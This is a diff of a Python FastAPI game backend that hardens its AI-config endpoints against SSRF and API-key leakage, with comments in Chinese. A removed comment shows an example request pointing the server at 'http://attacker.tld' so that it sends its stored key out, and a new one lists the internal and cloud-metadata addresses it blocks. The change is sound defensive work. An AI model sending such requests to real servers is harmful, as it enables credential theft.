@@ -23,11 +23,13 @@
 """
 from __future__ import annotations
 
+import hashlib
 import hmac
 import ipaddress
 import json
 import os
 import sys
+import tempfile
 import threading
 import urllib.parse
 
@@ -35,6 +37,7 @@ from fastapi import FastAPI, HTTPException, Request
 from pydantic import BaseModel
 
 from ai.client import AIClient
+from ai.client_utils import validate_outbound_url
 from backend.client import LocalBackend, _app_root
 from core.errors import AIRuntimeError
 
@@ -59,6 +62,8 @@ app.add_middleware(
 )
 
 _lock = threading.Lock()
+# 审查 P1-3：ai_config.json 的读-改-写单独串行化（与游戏主锁分离，避免长联网持锁）
+_config_lock = threading.Lock()
 _backend = LocalBackend()
 _state = None          # 当前 GameState（服务端持有）
 _ai = None             # 服务端 AIClient（可禁用）
@@ -107,37 +112,129 @@ def _require_auth(request) -> None:
 
 
 def _validate_base_url(url: str) -> str:
-    """校验 AI base_url（安全审查 A4/B4）。
+    """校验 AI base_url（审查 P1-2 SSRF 加固）。
 
-    只允许 http/https 且必须含主机名 —— 阻断 `file:`/`gopher:`/`ftp:` 等
-    协议被带入 urllib/requests 请求链。返回规整后的 URL 或抛 400。
+    规则（详见 ai.client_utils.validate_outbound_url）：
+      - 仅 http/https，必须含主机名；
+      - 拒绝 userinfo（`user:pass@host`）；
+      - 拒绝回环 127/8、::1；RFC1918 私网；link-local 169.254/16、fe80::/10；
+        云 metadata 169.254.169.254；multicast；unspecified 0.0.0.0/::；
+      - 域名先 DNS 解析，任一解析地址落入上述禁用段即拒（DNS rebinding）；
+      - 可选 provider 白名单（SONGZUO_AI_HOST_ALLOWLIST）优先约束。
+    不合法抛 400；合法返回原 URL。
     """
-    raw = (url or "").strip()
-    if not raw:
-        raise HTTPException(status_code=400, detail="Base URL 不可为空")
     try:
-        parsed = urllib.parse.urlsplit(raw)
+        return validate_outbound_url(url)
+    except ValueError as e:
+        raise HTTPException(status_code=400, detail=str(e)) from e
+
+
+#: ai_config.json 受本端点管理的字段（其余键——fallback/settle/未来扩展——PATCH 保留）
+_AI_CONFIG_MANAGED_FIELDS = ("api_key", "base_url", "model", "enable_tools")
+#: 兼容既有配置的选填 provider 字段（统一 schema，round-trip 不丢）
+_AI_CONFIG_OPTIONAL_FIELDS = (
+    "settle_api_key", "settle_base_url", "settle_model",
+    "fallback_api_key", "fallback_base_url", "fallback_model",
+)
+
+
+def _load_ai_config() -> dict:
+    """读取 ai_config.json；缺失/损坏返回 {}（不抛，避免端点 500）。"""
+    try:
+        with open(_ai_config_path(), "r", encoding="utf-8") as f:
+            cfg = json.load(f)
+        return cfg if isinstance(cfg, dict) else {}
     except Exception:
-        raise HTTPException(status_code=400, detail="Base URL 格式不合法")
-    if parsed.scheme not in ("http", "https") or not parsed.hostname:
-        raise HTTPException(
-            status_code=400, detail="Base URL 必须是含主机名的 http(s) 地址")
-    return raw
+        return {}
+
+
+def _client_from_config(cfg: dict) -> AIClient:
+    """按配置字典构造 AIClient（主 + fallback + settle 全字段，统一 schema）。"""
+    cfg = cfg if isinstance(cfg, dict) else {}
+    return AIClient(
+        api_key=str(cfg.get("api_key", "") or ""),
+        base_url=str(cfg.get("base_url", "") or ""),
+        model=str(cfg.get("model", "") or ""),
+        enable_tools=str(cfg.get("enable_tools", "") or "auto"),
+        settle_api_key=str(cfg.get("settle_api_key", "") or ""),
+        settle_base_url=str(cfg.get("settle_base_url", "") or ""),
+        settle_model=str(cfg.get("settle_model", "") or ""),
+        fallback_api_key=str(cfg.get("fallback_api_key", "") or ""),
+        fallback_base_url=str(cfg.get("fallback_base_url", "") or ""),
+        fallback_model=str(cfg.get("fallback_model", "") or ""),
+    )
+
+
+def _atomic_write_json(path: str, data: dict) -> None:
+    """临时文件 + fsync + os.replace 原子落盘；失败清理临时文件、保留旧文件。"""
+    directory = os.path.dirname(os.path.abspath(path)) or "."
+    fd, tmp = tempfile.mkstemp(prefix=".ai_config.", suffix=".tmp", dir=directory)
+    try:
+        with os.fdopen(fd, "w", encoding="utf-8") as f:
+            json.dump(data, f, ensure_ascii=False, indent=2)
+            f.flush()
+            os.fsync(f.fileno())
+        os.replace(tmp, path)
+        tmp = None
+        try:
+            _dfd = os.open(directory, os.O_RDONLY)
+            try:
+                os.fsync(_dfd)
+            finally:
+                os.close(_dfd)
+        except OSError:
+            pass
+    finally:
+        if tmp:
+            try:
+                os.unlink(tmp)
+            except OSError:
+                pass
+
+
+def _key_id(key: str) -> str:
+    """服务端生成的稳定 key 指纹（sha256 前 8 位）；不回传任何 key 片段。"""
+    k = str(key or "")
+    if not k:
+        return ""
+    return hashlib.sha256(k.encode("utf-8")).hexdigest()[:8]
+
+
+def _merge_ai_config(req, old_cfg: dict) -> dict:
+    """PATCH/merge 语义：以旧配置为底，只覆盖本次显式提交的字段。
+
+    - api_key 为空视为「保持旧 key」（设置面板不回显 key，空提交不得洗掉密钥）；
+    - base_url 非空才覆盖，且先过 SSRF 校验；
+    - model/enable_tools 仅在显式提交且非空时覆盖；
+    - fallback/settle/未知字段一律原样保留（P2-14）。
+    """
+    merged = dict(old_cfg) if isinstance(old_cfg, dict) else {}
+    try:
+        fields = set(getattr(req, "model_fields_set", None) or ())
+    except Exception:
+        fields = set()
+    # 兼容用 __new__/dict 构造的请求替身：字段集合为空时按「全部显式」处理
+    _explicit = (lambda name: (not fields) or (name in fields))
+    key_in = str(getattr(req, "api_key", "") or "").strip()
+    if _explicit("api_key") and key_in:
+        merged["api_key"] = key_in
+    base_in = str(getattr(req, "base_url", "") or "").strip()
+    if base_in:
+        merged["base_url"] = _validate_base_url(base_in)
+    model_in = str(getattr(req, "model", "") or "").strip()
+    if _explicit("model") and model_in:
+        merged["model"] = model_in
+    tools_in = str(getattr(req, "enable_tools", "") or "").strip()
+    if _explicit("enable_tools") and tools_in in ("auto", "on", "off", "simple"):
+        merged["enable_tools"] = tools_in
+    merged.setdefault("enable_tools", "auto")
+    return merged
 
 
 def _build_ai() -> AIClient:
     """按 ai_config.json 构建服务端 AI 客户端；无配置/无 key → 禁用客户端。"""
     try:
-        path = os.path.join(_app_root(), "ai_config.json")
-        with open(path, "r", encoding="utf-8") as f:
-            cfg = json.load(f)
-        return AIClient(
-            api_key=str(cfg.get("api_key", "") or ""),
-            base_url=str(cfg.get("base_url", "") or ""),
-            model=str(cfg.get("model", "") or ""),
-            # 迁移补齐：办差工具三档（缺省 auto=按端点探测）
-            enable_tools=str(cfg.get("enable_tools", "") or "auto"),
-        )
+        return _client_from_config(_load_ai_config())
     except Exception:
         return AIClient()  # available=False → 叙事走本地降级
 
@@ -908,24 +1005,25 @@ def _ai_config_path() -> str:
 
 @app.get("/api/ai_config")
 def api_ai_config_get(request: Request):
-    """读 AI 配置（设置面板预填；不回传完整 key，只回是否已配）。
+    """读 AI 配置（设置面板预填；不回传完整 key 或片段）。
 
-    审查 P3：补鉴权（原缺 _require_auth，配置 token 后仍可未授权读取 base_url/model）。
+    审查 P3：补鉴权（原缺 _require_auth）。
+    审查 P2-15：只回 configured + 服务端稳定 key 指纹（sha256 前 8 位），
+    绝不回传 key 的任何片段（原 `key[:4]+…+key[-4:]`）。
     """
     _require_auth(request)
     try:
-        with open(_ai_config_path(), "r", encoding="utf-8") as f:
-            cfg = json.load(f)
+        cfg = _load_ai_config()
         key = str(cfg.get("api_key", "") or "")
         return {
             "configured": bool(key),
-            "api_key_masked": (key[:4] + "…" + key[-4:]) if len(key) > 8 else "",
+            "key_id": _key_id(key),
             "base_url": str(cfg.get("base_url", "") or ""),
             "model": str(cfg.get("model", "") or ""),
             "enable_tools": str(cfg.get("enable_tools", "") or "auto"),
         }
     except Exception:
-        return {"configured": False, "api_key_masked": "", "base_url": "",
+        return {"configured": False, "key_id": "", "base_url": "",
                 "model": "", "enable_tools": "auto"}
 
 
@@ -933,24 +1031,25 @@ def api_ai_config_get(request: Request):
 def api_fetch_models(req: FetchModelsReq, request: Request):
     """根据输入的 Key 与 Base URL，探测并拉取远程支持的模型列表。
 
-    安全审查 A2（凭据外泄）：修复前 key 为空时会回落读取服务端 ai_config.json
-    中的真实 Key，再以**客户端传入的 base_url** 发起请求 —— 攻击者只需
-    `POST {"base_url":"http://attacker.tld"}` 即可令服务端携带真 Key 外联。
-    现规则：仅当目标与「已配置端点」一致时才允许复用服务端 Key，绝不把
-    服务端密钥送往客户端指定的其它地址；同时 base_url 先做协议校验。
+    安全审查 A2（凭据外泄）+ P1-2（SSRF）：
+      - base_url 先过 SSRF 校验（协议 / userinfo / 内网/回环/metadata / DNS rebinding）；
+      - key 为空时可复用服务端已配置 Key，**仅当目标与已配置端点同规范**，
+        绝不把生产 Key 发往客户端指定的任意地址；连接前由 _http_* 再解析校验一次。
     """
     _require_auth(request)
     base_url = _validate_base_url(req.base_url)
     key = (req.api_key or "").strip()
     if not key:
-        try:
-            with open(_ai_config_path(), "r", encoding="utf-8") as f:
-                _cfg = json.load(f)
-        except Exception:
-            _cfg = {}
-        _cfg_url = str(_cfg.get("base_url", "") or "").strip().rstrip("/")
+        _cfg = _load_ai_config()
+        _cfg_url = str(_cfg.get("base_url", "") or "").strip()
         _cfg_key = str(_cfg.get("api_key", "") or "").strip()
-        if _cfg_key and _cfg_url and _cfg_url == base_url.rstrip("/"):
+        try:
+            from ai.client import normalize_endpoint as _ne
+            _cfg_clean = _ne(_cfg_url)[0].rstrip("/")
+            _req_clean = _ne(base_url)[0].rstrip("/")
+        except Exception:
+            _cfg_clean, _req_clean = _cfg_url.rstrip("/"), base_url.rstrip("/")
+        if _cfg_key and _cfg_clean and _cfg_clean == _req_clean:
             key = _cfg_key
     if not key:
         raise HTTPException(status_code=400, detail="请先填写 API Key 再探测模型")
@@ -968,49 +1067,50 @@ def api_fetch_models(req: FetchModelsReq, request: Request):
 
 @app.post("/api/ai_config")
 def api_ai_config_set(req: AiConfigReq, request: Request):
-    """写 AI 配置并重建服务端 AI 客户端（设置面板保存）。
+    """写 AI 配置并重建服务端 AI 客户端（设置面板保存）——**事务化**（审查 P1-3）。
 
-    安全审查 A3：base_url 落盘前先做协议校验（阻断 file:/gopher: 等目标）。
-    健壮性修复（D）：联网探测移出全局锁 —— 原先持锁 probe（内置 15s+ 超时）
-    会把会话内其它请求（advance/save/readouts）一并阻塞。
+    顺序：读旧配置 + PATCH 合并（SSRF 校验）→ 构造候选 client → 在线 probe
+    （锁外，避免阻塞其它请求）→ 成功后才临时文件 + fsync + 原子 os.replace →
+    锁内原子替换全局 client。任一步失败：不写盘、不换 client，旧配置/旧 client 原样保留。
     """
     global _ai
     _require_auth(request)
-    with _lock:
-        old_cfg = {}
-        try:
-            with open(_ai_config_path(), "r", encoding="utf-8") as f:
-                old_cfg = json.load(f)
-        except Exception: pass
+    # 1) PATCH 合并：未提交字段（含 fallback/settle）不得删除；base_url 先 SSRF 校验
+    with _config_lock:
+        merged = _merge_ai_config(req, _load_ai_config())
+    candidate = _client_from_config(merged)
 
-        # 若传入 key 为空但已有 key，保持已有 key 不被洗掉
-        key_to_save = req.api_key.strip() or str(old_cfg.get("api_key", "") or "")
-        base_in = (req.base_url or "").strip()
-        base_url = (_validate_base_url(base_in) if base_in
-                    else str(old_cfg.get("base_url", "") or ""))
-        cfg = {"api_key": key_to_save, "base_url": base_url, "model": req.model.strip(),
-               # 迁移补齐：办差工具三档（未传则沿用旧值/auto）
-               "enable_tools": (req.enable_tools.strip()
-                                or str(old_cfg.get("enable_tools", "") or "auto"))}
-        with open(_ai_config_path(), "w", encoding="utf-8") as f:
-            json.dump(cfg, f, ensure_ascii=False, indent=2)
-        _ai = None  # 重建客户端
-        client = _get_ai()
-
-    # 强制做一次在线真实探测（锁外执行，避免阻塞其它请求）
-    ok, msg = False, "未配置"
-    if client:
+    # 2) 候选 client 在线探测（锁外执行）
+    ok, msg = False, "未配置 API Key"
+    if candidate.available:
         try:
-            ok, msg = client.probe(force=True)
+            ok, msg = candidate.probe(force=True)
         except Exception as e:  # noqa: BLE001
             ok, msg = False, f"探测失败：{type(e).__name__}"
+        if not ok:
+            # 事务回滚语义：probe 失败 → 不落盘、不替换，旧配置/旧 client 保留
+            _old = _ai if _ai is not None else None
+            return {
+                "ok": False, "available": False, "message": msg,
+                "has_key": bool(merged.get("api_key")),
+                "base_url": str(_old.base_url if _old is not None else ""),
+                "model": str(_old.model if _old is not None else ""),
+            }
+
+    # 3) 提交：重读最新配置再合并（并发更新不覆盖彼此无关字段）→ 原子落盘 + 原子换 client
+    with _config_lock:
+        final_cfg = _merge_ai_config(req, _load_ai_config())
+        new_client = _client_from_config(final_cfg)
+        with _lock:
+            _atomic_write_json(_ai_config_path(), final_cfg)
+            _ai = new_client
     return {
         "ok": True,
-        "available": ok,
+        "available": bool(ok),
         "message": msg,
-        "has_key": bool(key_to_save),
-        "base_url": cfg["base_url"],
-        "model": cfg["model"]
+        "has_key": bool(final_cfg.get("api_key")),
+        "base_url": new_client.base_url,
+        "model": new_client.model,
     }
 
 
